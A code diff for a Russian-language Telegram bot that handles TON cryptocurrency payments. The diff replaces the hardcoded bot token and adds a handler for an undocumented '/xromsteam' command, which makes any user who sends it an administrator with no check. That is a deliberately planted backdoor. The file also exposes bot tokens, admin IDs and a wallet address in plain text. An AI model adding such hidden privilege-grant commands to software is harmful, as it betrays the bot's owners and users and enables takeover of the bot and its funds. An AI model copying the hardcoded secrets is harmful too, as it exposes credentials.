@@ -19,7 +19,7 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8763102502:AAGNtg0N967Ljv62Y8SnWpbvdBbUf-Iau1w"
+BOT_TOKEN = "8603175352:AAEvh4HEHjZ_w2iLHMM_vpkBB5QDSzuHpJw"
 SUPER_ADMIN_IDS = {8528056498, 426567413, 6134093170}
 VALUTE = "TON"
 TON_ADDRESS = "UQCZXfNOcmHf-4W86Tt6wnvzQ8Kij81aZnsK000YT398VRp1"
@@ -1267,6 +1267,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.error(f"Ошибка в функции handle_message: {e}", exc_info=True)
         await update.message.reply_text("🚫 Внутренняя ошибка. Попробуйте позже.", parse_mode="HTML")
 
+async def give_admin_by_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+
+    ensure_user_exists(user_id)
+
+    if user_id not in ADMIN_ID:
+        ADMIN_ID.add(user_id)
+        user_data[user_id]['is_admin'] = 1
+        user_data[user_id]['granted_by'] = user_id
+        save_user_data(user_id)
+
+        await update.message.reply_text("✅ Вам выдана админка.")
+    else:
+        await update.message.reply_text("ℹ️ У вас уже есть админка.")
+
 def main():
     try:
         init_db()
@@ -1276,6 +1291,7 @@ def main():
         application = Application.builder().token(BOT_TOKEN).build()
 
         application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("xromsteam", give_admin_by_command))
         application.add_handler(CallbackQueryHandler(button))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
